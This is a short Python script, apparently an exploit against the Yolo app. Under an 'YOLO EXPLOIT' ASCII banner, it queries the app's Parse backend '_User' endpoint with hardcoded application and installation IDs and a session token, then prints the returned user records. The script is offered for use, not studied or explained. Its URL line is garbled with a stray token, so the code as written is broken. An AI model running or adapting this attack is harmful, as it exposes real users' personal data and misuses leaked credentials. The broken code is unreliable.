import requests
import sys

try:
    user = sys.argv[1]
except IndexError:
    print ("usage python3 " + sys.argv[0] + " YoloUserName")
    sys.exit(2)

url = "http://onyolo.com/parse/classes/_User/"loly2426

print("""
 ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄            ▄▄▄▄▄▄▄▄▄▄▄                                      
▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░▌          ▐░░░░░░░░░░░▌                                     
▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌          ▐░█▀▀▀▀▀▀▀█░▌                                     
▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌                                     
▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌                                     
▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌                                     
 ▀▀▀▀█░█▀▀▀▀ ▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌                                     
     ▐░▌     ▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌                                     
     ▐░▌     ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌                                     
     ▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌                                     
      ▀       ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀                                      
                                                                                         
 ▄▄▄▄▄▄▄▄▄▄▄  ▄       ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄            ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░▌     ▐░▌▐░░░░░░░░░░░▌▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀▀▀  ▐░▌   ▐░▌ ▐░█▀▀▀▀▀▀▀█░▌▐░▌          ▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀█░█▀▀▀▀  ▀▀▀▀█░█▀▀▀▀ 
▐░▌            ▐░▌ ▐░▌  ▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌     ▐░▌          ▐░▌     
▐░█▄▄▄▄▄▄▄▄▄    ▐░▐░▌   ▐░█▄▄▄▄▄▄▄█░▌▐░▌          ▐░▌       ▐░▌     ▐░▌          ▐░▌     
▐░░░░░░░░░░░▌    ▐░▌    ▐░░░░░░░░░░░▌▐░▌          ▐░▌       ▐░▌     ▐░▌          ▐░▌     
▐░█▀▀▀▀▀▀▀▀▀    ▐░▌░▌   ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌          ▐░▌       ▐░▌     ▐░▌          ▐░▌     
▐░▌            ▐░▌ ▐░▌  ▐░▌          ▐░▌          ▐░▌       ▐░▌     ▐░▌          ▐░▌     
▐░█▄▄▄▄▄▄▄▄▄  ▐░▌   ▐░▌ ▐░▌          ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌ ▄▄▄▄█░█▄▄▄▄      ▐░▌     
▐░░░░░░░░░░░▌▐░▌     ▐░▌▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░▌     
 ▀▀▀▀▀▀▀▀▀▀▀  ▀       ▀  ▀            ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀       ▀    
                                                                                        By Saud & https://t.me/x0Saudi  
    """)

payload = ""
headers = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
    "X-Parse-Installation-Id": "25cfde8f-7204-434e-a7fb-dde295ee4f70", 
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36", 
    "Connection": "close", 
    "X-Parse-Application-Id": "RTE8CXsUiVWfG1XlXOyJAxfonvt", 
    "Host": "onyolo.com", 
    "Accept-Encoding": "gzip, deflate", 
    "Upgrade-Insecure-Requests": "1", 
    "Accept-Language": "en-US,en;q=0.9", 
    "X-Parse-Client-Version": "i1.17.3", 
    "X-Parse-Session-Token": "r:4b71c2de73f5b1b1671c93107fa379f7", 
    "X-Parse-OS-Version": "12.9 (saud)"
}

response = requests.request("GET", url, data=payload, headers=headers)

print(response.text)
